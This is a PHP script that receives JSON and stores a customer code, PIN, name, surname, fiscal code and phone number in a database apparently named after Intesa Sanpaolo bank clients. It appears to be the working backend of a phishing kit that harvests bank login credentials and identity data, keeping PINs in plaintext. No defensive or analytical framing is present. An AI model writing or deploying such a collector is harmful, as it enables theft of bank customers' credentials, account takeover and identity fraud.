<?php
header('Content-Type: application/json');

// Configurazione DB (modifica con i tuoi dati)
$host = 'localhost';
$db   = 'intesasanpaoloclienti';
$user = 'root';
$pass = '';
$charset = 'utf8mb4';

$dsn = "mysql:host=$host;dbname=$db;charset=$charset";
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];

try {
    $pdo = new PDO($dsn, $user, $pass, $options);
} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'DB connection failed']);
    exit;
}

// Ricevi i dati JSON
$data = json_decode(file_get_contents('php://input'), true);

// Prepara i campi
$codice = isset($data['codice']) ? $data['codice'] : null;
$pin = isset($data['pin']) ? $data['pin'] : null;
$name = isset($data['name']) ? $data['name'] : null;
$surname = isset($data['surname']) ? $data['surname'] : null;
$fiscalCode = isset($data['fiscalCode']) ? $data['fiscalCode'] : null;
$phoneNumber = isset($data['phoneNumber']) ? $data['phoneNumber'] : null;

// Inserisci nella tabella users
$sql = "INSERT INTO users (codice, pin, name, surname, fiscalCode, phoneNumber, created_at) VALUES (?, ?, ?, ?, ?, ?, NOW())";
$stmt = $pdo->prepare($sql);
try {
    $stmt->execute([$codice, $pin, $name, $surname, $fiscalCode, $phoneNumber]);
    echo json_encode(['success' => true]);
} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'DB insert failed']);
} 